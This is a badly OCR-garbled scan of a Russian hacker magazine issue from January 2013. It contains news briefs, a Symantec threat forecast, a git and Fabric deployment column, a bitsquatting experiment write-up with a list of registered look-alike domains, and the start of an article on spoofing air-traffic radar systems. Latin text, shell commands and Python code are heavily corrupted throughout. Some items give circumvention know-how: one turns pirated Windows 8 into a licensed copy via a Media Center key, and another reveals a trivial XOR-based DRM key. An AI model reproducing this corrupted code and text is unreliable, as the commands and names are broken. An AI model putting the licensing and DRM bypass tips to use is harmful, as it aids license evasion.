ФРАНЦУЗЫ ИЗ ѴОРЕИ 
5ЕСІШІТѴ ОБЪЯВИЛИ, 
что первый эксплойт 
для\Л/іп8 + ІЕ10сНіА5І_Р/ 
АпІіКОР/ОЕР&РгоІМосіе 
с выходом из песочницы го- 
тов и выставлен на продажу. 



АНОНИМУС ВНОВЬ ПООБЕ- 
ЩАЛ В СКОРОМ ВРЕМЕНИ 

запустить«своюМкіІеак5». 
Стало известно, что проект 
будет называться ТѴ1.ЕВ, 
а в его основе лежит Р2Р- 
протокол. 



МІСЯ050РТ ПОКА НЕ ПЛА- 
НИРУЕТ портироватьОігесІХ 
11.1 споддержкой стерео 
куда-либо, кроме№іпс!оѵѵ58. 
Печальная новость для гей- 
меров и сочувствующих. 



012 



ХАКЕР 01 /168/2013 







БАНКОВСКИЙ ТРОЯНЕЦ ЕІШООКАВВЕК ОБОКРАЛ 30 000 ЧЕЛОВЕК, принеся своим создателям около 36 миллионов евро, сообщает Ѵегзаіе. 



ЛЕГКИМ ДВИЖЕНИЕМ РУКИ 
ѴѴІЫ00ѴѴ5 ПРЕВРАЩАЕТСЯ... 



5УМАЫТЕС ПРОЗРЕВАЕТ 
БУДУЩЕЕ 



КАК ПИРАТСКАЯ «ВОСЬМЕРКА» СТАЛ А ЛИЦЕНЗИОННОЙ 



КИБЕРБЕЗОПАСНОСТЬ В 2013 ГОДУ 



итуация вокруг выхода Мпсіоѵѵз 8 и так сложилась неоднозначная 
(многие видные деятели высказывалисьо новой ОС достаточно 
резко, опросы показывают, что переходить на «восьмерку» со- 
бирается не слишком большой процент пользователей, итакдалее),атут 
еще подоспела новостьотом, что пиратскую версию ѴѴіпсіоѵѵз 8 при помощи 
пары простых манипуляций можно превратить в лицензионную. 

Обнаружили этот баг пользователи Ресісііі. Оказалось, что система акти- 
вации ѴѴіпсіоѵѵб 8 таит в себе коварную ошибку, благодаря которой ОС можно 
превратить в лицензионную. Бесплатно и просто. Способ работает для Мпсіоѵѵз 
8 Рго, активированной временным ключом (во многих случаях активация сра- 
батывает даже на свежей системе, так что временный ключ не нужен). 

Чтобы регистрация из временной превратилась в постоянную, доста- 
точно загрузить ѴѴіпсіоѵѵз Месііа Сепіег (ѴѴМС) с сайта МісгозоН и уста- 
новить программу на компьютер. Дело, похоже, втом, что Месііа Сепіег 
должен был войти в часть платного пакета, но в последний моментего 
решили сделать бесплатным апгрейдом до 31 января 2013 года. Сейчас 
с приложением дается ключ, который (поошибке, конечно) активирует 
не только сам ѴѴМС, но и всю систему в целом, притом на неограниченное 
время! Замечу, что на момент написания этих строк способ по-прежнему 
работал. 




Моѵе ир {гот ѴѴіпсіоѵѵб 8 Іо ѴѴіпсіоѵѵб 8 Рго 




И гои/ К а пт) ЖМот I уои сап «« Мѵкм) I Ріо Р*ск «лгі «X* Ы 
ГЫ ІИХК Ы ѴЯпдот I Рго т «о* т «Мои М«*аС<«іа» 

Гог а І.тиод Чте. доі ѴІ/пОаоп 8 Рго Раск (ог І69 99 • 

•Л 'оВо. !Ь* «юисиот (О. ѴѴ«к~п І Рк 



Асісі ѴѴіпсіоѵѵб Месііа Сеп*ег *о ѴѴіпсіоѵѵб 8 Рго 



В уош РС • пттпд Мпдотг ( Ріо *п4 уои а И» Іо дИ ЖМоа» » Мжк* 



с«п «Длтадг Ы ГЫ ІоЪмипд «ркиі «Л» 

Рог а Іітііед Ііто, де( «Гіпдожі 8 Медіа Селіег Раск (ог (гее 



25-значный ключ с сайта МісгобоП присылаютв письме втечение 72 часов после подачи заявки. 



НЕОЖИДАННЫЕ РЕЗУЛЬТАТЫ АѴ-ТЕ5Т 



АНТИВИРЬМІСЯОБОРТ 
5ЕСІІЯІТѴ Е55ЕМТІАІ.5 ЕДИН- 
СТВЕННЫЙ НЕ СУМЕЛ ПРОЙТИ 
ТЕСТ НЕЗАВИСИМОГО ИНСТИ- 
ТУТА ИТ-БЕЗОПАСНОСТИ 



рошедший год был несамым легкимдля компании 
Бутапіес— утечки исходников и хакерские атаки 
подпортили репутацию компании и нервы ее сотруд- 
ников. Тем не менее Буппапіес остается серьезным игроком 
рынка информационной безопасности, поэтому пройти мимо 
интересногоаналитического прогноза компании мы несмог- 
ли :). Специалисты Бутапіес опросили сотни штатных и неза- 
висимых экспертов по безопасности, собрали множество идей, 
поработали с полученными данными, проведя коллективный 
мозговой штурм, и в итоге получили интересный прогноз 
на 2013 год. Итак, какиетенденции ждут нас в этом году? 

1. Киберразборки станут нормой. Начиная с 2013 года, ло- 
кальные киберконфликты между государствами, органи- 
зациями и частными лицами будут играть ключевую роль 
вСети. Примеры последнихлетпоказали, чточерезинет 
можноосуществлятьэффективный шпионаж. В 2013 году 
государства, частные компании и отдельные граждане будут 
использовать кибератаки также для демонстрации силы 
или в качестве «послания» своим оппонентам. Кроме того, 

в новом году не успокоятся и так называемые хактивисты. 

2. Малварь, котораятребуетденеги запугиваетпользо- 
вателей. Фальшивые антивирусы продолжат свое черное 
дело, но станут действоватьжестче и деструктивнее — бу- 
дутблокироватьсистему, шифроватьфайлы, запугивать 
пользователей присутствием на машине вирусов и так далее. 
Эксперты прогнозируют, что в 2013 году шире распростра- 
нится именно «бизнес-модель», где главная цель— запугать 
пользователя и принудитьего немедленноотправитьденьги. 

3. Мобильные зловреды станутеще популярнее. Только 
за последние девять месяцев количество вредоносных 
мобильных приложений выросло на 210%, так что тенденция 
очевидна. Многие из разработчиков рекламныхзловредов 
также работают под видом легальных компаний, которые 
помогаютмонетизировать«бесплатные» приложения под 
АпсІгоісІ. 

4. Монетизация социальных сетей принесетновые опас- 
ности. Пользователи излишне доверяютсоциальным сетям 
ихраняттам персональныеданные,тратятденьги на игры, 
дарятподарки друзьям. Вскоре ЕасеЬоок собирается на- 
чать очередной этап монетизации, входе которого должна 
появиться платная возможностьдоставки подарков. 
Естественно, это откроет новые возможности для зло- 
умышленников. Платежные данные пользователей и дру- 
гая потенциально опасная информация будут использо- 
ваться в социальной сети, что облегчит кражу. 

5. Пользователи переходятна мобильныеустройства 

и в облака, а киберпреступники тянутся за ними. Стре- 
мительный роствредоносного ПО для АпсІгоісІ в 2012 году 
говоритотом, что киберпреступники следуютзатенденци- 
ями рынка. Кактолько АпсІгоісІ стал популярен, мошенники 
переориентировались на него. Специалисты Бутапіес 
считают, что скоро мобильныеустройства и облачные 
сервисы будут приносить киберпреступникам доход, 
сравнимый с доходом от платных 5М5. Возможно, хакеры 
найдут эффективные способы внедряться в чужие платеж- 
ные сессии и осуществления фродовыхтранзакций. Ктому 
же в последнее время проявились проблемы с грамотной 
реализацией 55І_ в мобильных приложениях. Активная 
эксплуатация уязвимостей такого рода может начаться 
в 2013 году. 




ХАКЕР 01 /168/2013 



013 





МЕ6АЫЕѴѴ5 



ПРИЛОЖЕНИЕ ОК.ѴѴЕВ ДЛЯ АИОЯОІО (в полной и ІідЫ-версии) было скачано более десяти миллионов раз, похвасталась компания. 



СКАНЕР-РЕКОРДСМЕН 

ЯПОНЦЫ ПОКАЗАЛИ ОДИН ИЗ САМЫХ БЫСТРЫХ СКАНЕРОВ В МИРЕ 



1000 страницза 90 минут способен оцифровать сканер, созданный инженером 
Ооодіе Бенджамином Стаффином. Это для сравнения. 

□ наш век планшетов и электронных книг мы порой не- 
справедливо забываем о существовании обыкновенных 
книжек — бумажных. А ведь вопрос оцифровки бумажной 
литературы по-прежнему открыти оченьактуален. Нет, вовсе 
не для пиратов, как многие сейчас подумали, но для библиотек и на- 
учных учреждений. В этом свете детище японских ученых кажется 
не просто крутым, но и весьма полезным агрегатом. 

Сканер ВРБ-АиЫЬооИІірріпдзсаппіпд) создан учеными Токий- 
скогоуниверситета (лаборатория Ишикава Оку). Стоит отметить, 
что эта лаборатория долгое время разрабатывала технологию 
сверхбыстрой съемки объектов в движении с нормальным фокусом. 
Готовуютехнологиюяпонцы решили применитьна практике. ВР5- 
Аиіо способен оцифровать 1 000 страницза четыре минуты. То есть 
его производительность равна 250 страниц в минуту, а это очень 
и очень высокий показатель. 

Сканерустроен весьма просто. Книга располагается на специ- 
альной подставке, над которой установленоустройство для пере- 
листывания страниц. Лазеры формируют на поверхности открытой 
книги сетку, после чегосканерделаетснимок. Съемка производится 
с нескольких ракурсов, после чего все три отснятые кадра автома- 
тически объединяются. Это помогает избежать искажений, которые 
обычно появляются при обычном сканировании. 



йРМ 15 БОР ШІ_2 

СМЕШНОЙ ПРИМЕР СИСТЕМЫ ЗАЩИТЫ ОТ КОПИРОВАНИЯ 

анимательную историю поведал всвоем блоге ЭшерЛенг- 
тон, сотрудник Л иверморской национальной лаборатории. 
Будучи законопослушным гражданином, Ленгтон приоб- 
рел в онлайн-магазине некий фильм и собрался приятно провести 
вечер за его просмотром. Но, как это часто бываете защищенным 
контентом, фильм потребовал установки плеера откомпании 
1_еаріпд Вгаіп. Сустановкой ПО на іРЬопеуЛенгтона возникли про- 
блемы, пытаясь разобраться с которыми он обнаружил, что фильм 
лежит в скрытой папке, в виде самых обычных файлов формата тоѵ 
(проигратькоторые неудалось). Удивившись, Ленгтон продол- 
жил копать и вскоре пришел к выводу, что плеер от І_еаріпд Вгаіп 
не что иное, как скрипт на РуіЬоп, построенный вокруг нескольких 
библиотек ѴІ_С. Он совершал какие-то действия надфайлом, пре- 
жде чем отдать его плееру. 

Ленгтон сравнил обработанный файл сзашифрованным. 
Оказалось, что «неприступный алгоритм шифрования» сводится 
ктому, что в первых 15 килобайтах файла несколько начальных 
байтов каждого килобайтного блока были ХОР'нуты с «секретным 
ключом», а именно строкой «РАМ00М_5ТРІМ6». 

Уже это смешно, но вишенкой на торте стало чтение раздела РАО 
на сайте компании Ьеаріпд Вгаіп. Производители уверяют, чтоим 
«неизвестноосуществовании более надежной схемы, чем эта. 
ѴѴіпсІоѵѵз Месііа йРМ легко поддается взлому и работаеттолько под 
ѴѴіпсІоѵѵз, тогда какалгоритм ВгаіпТгиБІ отлично работаетна любой 
платформе и его практически невозможно взломать». 





| • ІзИікаѵѵа Оки І_аЬогаІогу 

У ТЪѳ ІМѵѳгвйу Ы Токуо 





КТО НАЗЫВАЛ ДИСПЛЕИ С СО- 
ОТНОШЕНИЕМ СТОРОН 16:9 
«танкощелью»? Радуйтесь, 
теперь вы увидите настоящую 
бойницу— сразу ряд компа- 
нийанонсировали мониторы 
ссоотношением сторон 21:9! 
Скажем, модель Ю ЕА93 бази- 
руется на ІР5-матрице, имеет 
диагональ29" и разрешение 
2560 х ІОѲОточек. Кстати, 
стоитьтакой монстр будет 
всегобЗАдоллара. 




ПРАВИТЕЛЬСТВО РФ НАЗВА- 
ЛО «борьбу с распростране- 
нием нелегального контента, 
втом числе с использованием 
торрентов» одной из основ- 
ных задач до 2018 года. 



ПОЧТИ В ДВА РАЗА БОЛЬШЕ 
МАЛВАРИ ДЛЯ МОБИЛЬНЫХ 
УСТРОЙСТВ былообнаружено 
втретьем квартале 2012 года, 
сообщила компания МсАІее 
в своем отчете. 



014 



ХАКЕР 01 /168/2013 










ПАЛАТА ПО ПАТЕНТНЫМ СПОРАМ не обнаружила в изображении іРагі «отличительных особенностей» и повторно отказала Арріе в регистрации. 



КАК вдохновиться 

ТРОЛЛИНГОМ В ТѴѴІТТЕР 

УДИВИТЕЛЬНАЯ ИСТОРИЯ ПИТЕРА МОЛИНЬЕ 

аверняка имя Питера Молинье знакомо нашим читателям. 
На всякий случай поясним и напомним, что этот без пре- 
увеличения легендарный разработчик игр придумал ВІаск 
& ѴѴЬНе, ТЬе Моѵіез, РаЫе и множество других очень необычных 
игрушек, которым зачастую присущи черты симулятора бога. 
Кстати, Молиньеявляется родоначальником этого жанра. Успел 
Молинье принять и непосредственное участие в создании МісгозоК 
Кіпесі, поработать в Еіесігопіс Агіз и основать ЫопЬеасі Біисііоз. 

Однако, несмотря на все эти бесспорные заслуги «перед обще- 
ством», Питер Молинье всегда оставался личностью неодно- 
значной и довольно эксцентричной. Например, он славится тем, 
чтозадолгодо релиза игры любитрассказатьо какой-нибудьфан- 
тастической функциональности, которая обязательно будет в ко- 
нечном продукте, но в итоге, разумеется, ничего подобного в игре 
не обнаруживается. Из-за этого Молинье приходилось десятки 
раз извиняться перед публикой. Словом, идей у Молинье всегда 
было даже слишком много, и реализовать их все (и реализовать 
правильно) удавалось далеко не всегда. Весной 2012 года Питер 
Молинье неожиданно для всехобъявил, что покидаетМісгозоН 
и ЫопНеасі ради стартапа 22 Сапв, который он основал совместно 
с некоторыми сотрудниками ЫопЬеасі. Напомним, что сейчас леген- 
дарному разработчику за пятьдесят, так что его решение бросить 
все выглядело действительно странным. 

Еще более странным для многих стало то, что на этот шаг Мо- 
линье вдохновил... двойник-тролль из ТѵѵіПег. Нет, это не шутка. 

С 2009 года в ТѵѵіКег появился пользователь (ЗРеІегМоІугіеих, кото- 
рый день ото дня публиковал безумные и смешные идеи игр. Чего 
там только не было! Игра про почтальона с рентгеновским зрением. 
Игра про воображаемого друга, которого нужноубедить в реально- 





3а аккаунтом ГЭРеІегМоІусІеих, как оказалось, скрывался Адам Капоне — молодой 
игровой дизайнер, еще в детстве полюбивший игры Молинье (в частности, ТЬете 
Рагк). Шуточный аккаунтон открыл, когда понял, что ему отчаянно хочется, чтобы 
большее число девелоперов не боялись взваливать на себя непосильные и почти 
невозможные задачи, как это всегда делал Питер Молинье. 

сти главного героя. Гонки, где ты управляешь не машинами, но до- 
рогой. Игра, где персонажпритворяется слепым и должен наты- 
каться на окружающие предметы, дабы не вызывать подозрений. 
Мультиплеер для восьми игроков проогромного осьминога, где 
каждый игрокуправляетсвоим щупальцем, к которому прикрепле- 
нооружие. Настоящий пирдуха. Вскоре на аккаунтподписались 
такие монстры, как Коіаки и 6ате5еіѴѴаІсЬ, шутника фол овил и уже 
десяткитысяч человек, и все гадали, ктожеонтакой. 

Один только Молинье считал все это раздражающим, а шутника 
жалким. Время шло, и Молиньезаметил, что начал проникаться 
ксвоемудвойнику симпатией. Его идеи, конечно, были дурацкими 
и смешными, но вто же время весьма интересными. Становилось 
ясно, что кто бы ни стоял за всем этим, он весьма умен. Молинье 
стал восприниматьтвиты двойника как послания отсобственного 
молодого альтер эго, вспомнил то время, когда хотел и отчаянно 
стремился создатьтакую игру, какой мирникогда не видел раньше. 

Все это привело ктому, что весной 2012 года он решил попро- 
бовать еще раз: бросить все и попытаться воплотить в жизнь свои 
безумные и не похожие ни на что идеи. Так была основана студия 
22 Сапз. Пока, кроме неоднозначного проекта Сигіозііу, студия 
Молинье вывела на Кіскзіагіег симулятор бога босіиз, минималь- 
ная сумма финансирования которого составляет 450 тысяч фунтов 
стерлингов. Сбор средств начался в конце ноября. 




ПРОШЛИ ОПЕРАЦИИ «КИБЕРПОНЕДЕЛЬНИК» И «ТРАНСАТЛАНТИКА» 



ФЕДЕРАЛЫ ИЗ США (ІСЕ) ВМЕСТЕ 
С ПРАВООХРАНИТЕЛЯМИ ЕВРОПЫ 
КОНФИСКОВАЛИ 132 ДОМЕНА 
У ТОРГОВЦЕВ КОНТРАФАКТОМ 




ХАКЕР 01/168/2013 



015 






НЕДОЕВ 




КОЛОНКА 
СТЁПЫ ИЛЬИНА 



ПРО ГИГИЕНУ 
РАБОТЫ С КОДОМ 



ГРЕХ ПРОГРАММИСТОВ 

Сложно представить, сколько людей по- 
прежнему создают папки ѵОООІ, ѵ0002, чтобы 
хранить исходники разных версий своего 
проекта. Но я знаю точно: их много! За по- 
следний год мне не раз приходилось повто- 
рять прописные истины о том, что так делать 
нельзя, — пора оформить их в виде колонки. 
Следующие рекомендации, конечно, не при- 
годятся тем людям, которые профессионально 
и давно занимаются разработкой, но тем, кто 
только начинает свой путь, их необходимо про- 
читать обязательно. Для примера возьму самую 
распространенную сегодня ситуацию — разра- 
ботку веб-проекта. 

Молиться на систему контроля версий. 

Что называется, без вариантов. Если в рабочей 
папке проекта у тебя груда файлов со 100500 
копий бэкапов, в которых ты уже и сам давно 
не можешь разобраться, то нет другого пути, 
как прямо сейчас начать использовать біі (ну 
или другую систему контроля версий). Чтобы 
прочитать этот мануал (Ьі^.Іѵ/5Мт90П о том, 
как начать работу с біі, коммитить изменения 
в коде и решать возникшие конфликты, уйдет 
минуттридцать, но после этого тебе никогда 
не придет в голову идея работать с исходниками 
без контроля версий. Работаешь над проектом 
не один?Тогдатем более нужен единый репози- 
торий кода. А как еще можно совместно работать 
с исходниками (а представь, каково крупным 
компаниям, где над одним проектом работают 
сотни программистов), вести параллельную ра- 
боту над разными фичами и не мешатьдругдругу, 
если не использовать единый репозиторий 
кода? Кстати, его можно держатьу себя, а можно 
в специальном хостинге. И если на СііНиЬ (діІЬиЬ. 
сот ) придется заплатить за закрытый репозито- 
рий (иначе все сорцы будут доступны ореп- 
5оигсе),то на ВіШискеІ ( ѵѵѵѵѵѵ.ЫіЬискеІ.сопп І 
можно использовать бесплатно при условии, 
что работать с ним будет не больше пяти юзеров. 
Таким образом, помимо надежного хостинга 
кода, ты получаешьеще и классный инструмент 
с кучей дополнительных фишек, которые будут 
особенно полезны при командной работе. 

Забыть про РТР. Все когда-то делалитак: 
редактировали файлы на локальном компе 
и потом загружали их на сервер по РТР. Но де- 
латьтак больше не надо. Когда мы говорим 



о худо-бедно серьезном проекте, где постоянно 
выкатываются какие-то изменения, то быстро 
приходится переключаться на другие реше- 
ния, —и опятьже не понимаешь, какты жил 
раньше біі или МегсигіаІ. Поскольку весь кодуже 
лежит в репозитории, то все, что нужно сделать 
для развертывания кода на новом сервере,— это 
подключиться по 55Н (желательно по ключу, что- 
бы не вводитьлогин и пароль) и в рабочей папке 
склонироватьвсефайлы из репозитория (проще 
говоря, скачатьактуальную версию всех файлов): 

$ 55Іі 5есигеи5ег@$есигеИо5Т.сош 
$ ссі риЫіс_ИТт1 
$ еіТ сіопе бі1@§іТІ-шЬ.сот:«-* 
5есигеи5ег/ехатр1е.сот.§і1: 

Далее, чтобы накатить изменения, элемен- 
тарно выполняются діі риІІ'ом (загрузить все 
обновления файлов из репозитория): 

$ 55И 5есигеи5ег@5есигеНо5І.сот 
$ ссі риЬ1іс_Іі*т1/ехатр1е.сот 
$ §ІТ риіі огі§іп тазТег 

И боже упаси тебя что-то вручную по- 
править на «боевом сервере». Должна быть 
железная система: любые изменения в коде 
должны быть обязательно занесены в репози- 
торий кода. Только тогда это имеет смысл. 

Умно развертывать. Естественно, мало кто 
каждый раз вручную подключается к серверу 
поББН и накатываетизменения.Зачемэто 
делать, если процесс легко автоматизируется? 
В простейшем случае можно самому написать 



элементарный скрипт, который выполняет 
подключения, переходит в рабочую папку 
и выполняет нужные команды біі'а. Дополни- 
тельно, с помощьютехже скриптов, могутбыть 
настроены и поправлены какие-то конфиги 
(например, параметры для доступа кбазе 
данных: в простейшем случае дома и на сервере 
они разные). Впрочем, чтобы незаморачивать- 
ся с настройками самому, есть полно готовых 
инструментов, которые позволяют обустроить 
процесс развертывания (деплоя) более гибко 
и, что важнее, просто. Мы упоминали их в РАСГе 
прошлого номера: РаЬгіс ІІаЫіІе.огд І.СарізІгапо 
ІсарізІгапогЬ.сот І. СНе? [ уѵѵѵѵѵ.орзсосіе.сот/ 
сНеП . Примертакогоскрипта на РаЬгіс: 

сІе-Р сіеріоу ( ) : 

сос!е_сІіг = , /5гѵ/сI^ап§о/турго^ес1: , 
іл»Ші 5е**іп§5(магп_оп1у=Тгие) : 

ІР гипСЧезТ: -д %$" % 
сосІе_сІіг) . -Раііесі : 

гип( И §іТ: сіопе изегф-^ 
ѵсзНозІ: : /раІЬ/Іо/геро/^ 

4И %з" % сосІе_сІіг) 
міІИ ссІ(сосІе_сІіг) : 
гип("§іТ: риіі") 

Прелесть в том, что процедуру деплоя при по- 
хожем подходе можно делать очень быстро 
и сразу на многих серверах. 

Все эти бесхитростные приемы, правда 
в более навороченной форме, используются 
в любой технологической компании. На это 
есть банальная причина: это просто удобно. X 

ВііВискеІ предо- 
ставляет приват- 
ные репозитории 
кода бесплатно, 
еслиснимирабо- 
таетнеболеепяти 
человек 



вое 


«ВіІЬцскеІ Пеемюеті Корсяволи • 




®- п* 1 



зіадіпд А с*** - <*>* эссотр «,» 

Д МОѴ0КІ < Ро* <Х схозискх- аіім* * Рсаотпд 




Оѵаіѵмм Зои хе Сотлхы Рин Перчи*» *? ОсжтЮеОе О 

сидіпд /игіэ.ру Зои хе ОМ НМо>у 



ОѴНГОЛП *5мо2« >»4»т.«до • (О ■ 1Ьвс2сР #ІМН' • 




1 1 '«•„ «»еле*.сеяг івоті к'Н**е 

г .* <•( »М1<Г<М и, в )ѵч . Лег еее 



1 .» "НОГ* И.и|| 

4 чГ**е Оелее.сел'.и'І» Ммііі мео-1 -.ле ,.4»4 
г і Ігш ѵчѵі ичие*. >й)4пн, •'! 

> 4 I'— 4*ѵч*с«Ч.и і«#о.< ШЬл 



016 



ХАКЕР 01 /168/2013 







Анатолий Алиэар ІаІігагѲдтаіІ.сот) 




& 

РгосМ-СопсерІ 

БИТСКВОТТИНГ: 

ПРОВЕРКА ЭФФЕКТИВНОСТИ 



ЧТО ЭТО ТАКОЕ 

Битсквоттинг — регистрация доменных имен, 
которые отличаются на один бит от оригиналь- 
ных. Битсквоттинг по форме похож на тайп- 
сквоттинг, но придуман совершенно для других 
целей. Тайпсквоттеры рассчитывают, что поль- 
зователь опечатается при вводе ІІРІ_ или 
не заметит отличия на один символ в ссылке. 
Битсквоттинг делает ставку на то, что какое- 
нибудь из подключенных к интернету устройств 
случайно ошибется и изменит один нужный бит 
в запросе к йМБ-серверу, так что трафик пойдет 
вместо оригинального сайта к злоумышлен- 
нику. 

Это может быть банальная ошибка как 
в стеке ТСР/ІР, так и в памяти маршрутизатора, 
в браузере и так далее, на любом этапе обра- 
ботки запроса. Ошибки в РАМ возникают из-за 
перегрева, скачков напряжения, дефектов обо- 
рудования, даже космического излучения. На- 
пример, для ПК с 4 Гб РВАМ количество ошибок 
составляет от трех в час до трех в месяц. Можно 
самостоятельно посчитать, сколько сбоев про- 
исходит во всех компьютерах мира. 

Например, вот бинарное представление 
адреса «ВКонтакте»: 01110110 01101011 00101110 
01100011 01101111 01101101 (ѵк.сот). Существует 
16 альтернативных вариантов, каждый из кото- 
рых отличается от оригинала на один бит. 



На практике реально зарегистрировать 
мы не сможем ни один из этих доменов, так 
что «ВКонтакте» — один из немногих сайтов 
в интернете, который защищен от битсквот- 
терской атаки. Чего не скажешь о тісгозоК. 
сот (72 варианта для битсквоттинга), атагоп. 
сот (48 вариантов) и прочих. 

КТО ЭТО ПРИДУМАЛ 

Выдвинул идею на конференции ВІаск Наі 
в августе 2011 года хакер Артем Динабург 
(Агіет РіпаЬигд). 

Автор объясняет, что для такого типа атаки 
нужно выбирать домены СОМ и рекламных 
сетей, контент с которых подгружается на ты- 
сячи популярных сайтов. Это такие домены, 
как {Ьссіп.пеі, 2тсіп.пеІ и акатаі.сот. Для про- 
верки своей теории Динабург зарегистриро- 
вал 32 домена методом битсквоттинга, в том 
числе домены СОМ и рекламных сетей. Список 
адресов, которые принимали участие в экспе- 
рименте: ікатаі.пеі, аеаіоп.сот, а-агоп.сот, 
атагдп.сот, тісгозтК.сот, тісгдзоК.сот, 
тіагоБоК.сот, іісгозоК.сот, тісгозпК.сот, 
тЬсгозоК.сот, еісгозоК.сот, тіс2озоМ.сот, 
тісгоЗоК.сот, Іібе.сот, Отсіп.пеі, 2-сІп.пеІ, 
2есіп.пеІ, 2ІсІп.пеІ, 2т^п.пе1, 2тІп.пеІ, 2обп.пеІ, 
бтсіп.пеі, ІЬЬбп.пеІ, {Ьдсіп.пеі, дЬссіп.пеІ, ^сгіп. 



пеі, бЬссіп.пеІ, гоор-зегѵегз.пеі, гіоиЫесЬіск. 
пеі, сіобЫесІіск.пеС 

РЕЗУЛЬТАТ ЭКСПЕРИМЕНТА 

Эксперимент Динабурга показывает, что смысл 
есть. К сайтам действительно поступали 
ОМ5-запросы и НТТР-запросы и подключались 
сторонние устройства. За семь с половиной ме- 
сяцев с сентября 2010 года по апрель 2011 года 
поступило в общей сложности 52 317 запросов 
с 12 949 уникальными ІР-адресами. Если не счи- 
тать трех искусственных всплесков трафика, 
то в среднем запросы шли с 59 уникальных 
ІР-адресов в день. 

Артем Динабург до сих пор продолжает 
анализировать данные и публикует свежие 
результаты в блоге сІіпаЬигд.огд . Недавно 
он выложил запись всех пакетов (РСАР), по- 
ступивших в ходе эксперимента: сііпаЬиго.огд/ 
сіа1а/бп5Іодз.Іаг.72 . Там есть и автоматически 
сгенерированные краш-репорты с неправиль- 
ным битом в адресе, и запросы ѴѴіпгіоѵѵз Ііргіаіе. 
Эти примеры показывают, что причиной были 
действительно ошибки в битах, а не непра- 
вильно введенный вручную ІІРІ_. 

В качестве бонуса — скрипт на РуіЬоп 
для генерации битсквоттерских доменов: 
сііпаЬигд.ого/сіаІа/ЬіІздиаІ.ру . □□ 



00101110 01100011 
(бк.сот) 

00101110 01100011 
(Тк.сот) 



00110110 

01101111 

01100110 

01101111 

01111110 

01101111 

01110010 

01101111 

01110100 

01101111 

01110111 

01101111 

01110110 

01101111 



01101011 

01101101 

01101011 

01101101 

01101011 

01101101 

01101011 

01101101 

01101011 

01101101 

01101011 

01101101 

00101011 

01101101 



00101110 

(~к.сот) 

00101110 

(гк.сот) 

00101110 

(■Ск.сот) 

00101110 

(мк.сот) 

00101110 

(ѵ+.сот) 



01100011 

01100011 

01100011 

01100011 

01100011 




Количество запросов, поступивших на 32 домена, 
зарегистрированных методом битсквоттинга во время 
эксперимента с сентября 2010-го по апрель 2011 года 



Количество уникальных ІР-адресов, с которых поступали 
запросы, без учета трех искусственных всплесков 
трафика 



ХАКЕР 01 /168/2013 



017 



С0ѴЕК5Т0КѴ 



Андрей Костин ІапгігеіЙапсІгеісоБІіп.сот) 










ВОЗДУХЕ 



КАК НЕЗАЩИЩЕННОСТЬ НОВЫХ 
СРЕДСТВ КОММУНИКАЦИЙ 
В АВИАЦИИ МОЖЕТ ПРИВЕСТИ 
К КАТАСТРОФЕ 








Гражданская авиация постепенно отказывается от традиционных 
радарных систем в пользу более современных цифровых инструментов 
связи. Проблема в том, что новые технологии потенциально позволяют 
злоумышленникам встревать между пилотом и диспетчером, ставя под 
удар сотни и тысячи жизней пассажиров. И это возможно уже сейчас. 



ГДокладЧ 

[да] 



018 



ХАКЕР 01 /168/2013 






Спуфинг в воздухе 



СЦЕНАРИЙ НЕ ИЗ ФИЛЬМА 



Представь себе картину. Рейс АО5ВЮ90 летит в ночи, уверенно 
двигаясь по заданному направлению. Пилот и диспетчер видят 
спокойное небо без трафика. Курс настроен, самолет на автопилоте. 
Ничто не предвещает беды. Вдруг на экранах диспетчера появляются 
десятки самолетов, из ниоткуда попавшие на экраны радара, словно 
привидения. Диспетчер в панике — ведь на его полетном листе толь- 
ко один рейс, АО5ВЮ90. Пилот наблюдает ту же картину на своем 
радаре, хотя через бортовое окно небо чистое, как и раньше. Смяте- 
ние закрадывается в души пилотов. Внезапно автопилот начинает 
маневры, чтобы избежать потенциального столкновения. С другого 
конца связи диспетчер дает совсем противоположные указания. 
Времени на размышление нет ни у пилота, ни у диспетчера, ни у авто- 
пилота... Так же как нет времени для вывода самолета из автопилота 
и из рискованного маневра. Крушение и катастрофа... 

И это совсем не сценарий для очередного патриотического боеви- 
ка по книге Тома Кленси. Все это может оказаться вполне обыденной 
реальностью в скором будущем, причем выглядеть будет до предела 
просто. Представь себе компьютер, за которым молодая девушка (ко- 
нечно же, Джоли с короткой стрижкой) наблюдает в своей консоли: 
«РІид-п-рІау Ьагсіѵѵаге... ВиіІсІ сосіе... СІіск-п-аиаск... РѴѴІМ... Тагдеі 
сіоѵѵп... МІ55І0П сотріеіесі». 

Стало не по себе? Как такое возможно? Автор этой статьи — Ан- 
дрей Костин — проводит исследования безопасности авиационных 
технологий. И сегодня рассмотрит более детально, как работают 
системы управления воздушными потоками старого и нового по- 
коления, а также представит найденные во время его исследования 
уязвимости и наиболее серьезные риски, связанные с ними. Момент 
для того, чтобы начать такой разговор, выбран тоже неслучайно. 
Авиатехнологии находятся на границе нового технического прорыва, 
и так, как это уже случилось со смартфонами и сетями мобильной 
связи примерно 5-10 лет назад, новые технологии приводят к новым 
проблемам. На этот раз — куда более опасным. 



ПРИНЦИПЫ РАБОТЫ РАДАРОВ 
ВОЗДУШНОГО ПОТОКАМ— 



Радары (или радиолокаторы) впервые появились в 1940-х годах 
в военной отрасли. В первую очередь они разрабатывались именно 
для нужд авиации и морского флота. Применение систем на базе 
импульсной радиопередачи позволяло определять присутствие 
в воздухе или на море конкретных физических объектов, а также 
расстояние до движущихся объектов и воздушный/морской сектор 
их местонахождения. Эта информация потом могла использоваться 
для наведения орудий или ракет. 

На данный момент для целей воздушного наблюдения и управле- 
ния воздушными потоками существуют два типа радаров: 

• первичные радары наблюдения (ПРИ, Ргітагу БигѵеіІІапсе КасіагБ 
или Р5Р) представляют собой радиолокаторы, которые определяют 
присутствие воздушных судов при возврате ЭМ-волн в результате 
отражения от воздушного объекта; 

• вторичные радары наблюдения (ВРН, Бесопсіагу БигѵеіІІапсе 
РасІагБ или 55Н) широко используются на сегодняшний день 
для маркировки и отслеживания судов и маршрутов. Радар 
типа ВРН определяет и подсчитывает примерное (но весьма 
точное) местонахождение воздушных судов при помощи актив- 
ной радиопеленгации на данное воздушное судно, на котором 
всегда установлен транспондер. Транспондеры (Ігапзропсіег или 
ІгапБпліиег-гезропгіег) представляют собой устройства типа пере- 
датчик-ответчик, которые принимают радиопеленгот станции 
контроля воздушного пространства и отвечают на них соответству- 
ющими параметрами. 

Оба типа радаров имеют ряд недостатков. Во-первых, это мораль- 
но устаревшая технология, которая хорошо показала себя за 50 лет 
работы, но которая уже не вписывается в новые технологические 
рамки и требования. Во-вторых, производство и поддержка подобных 
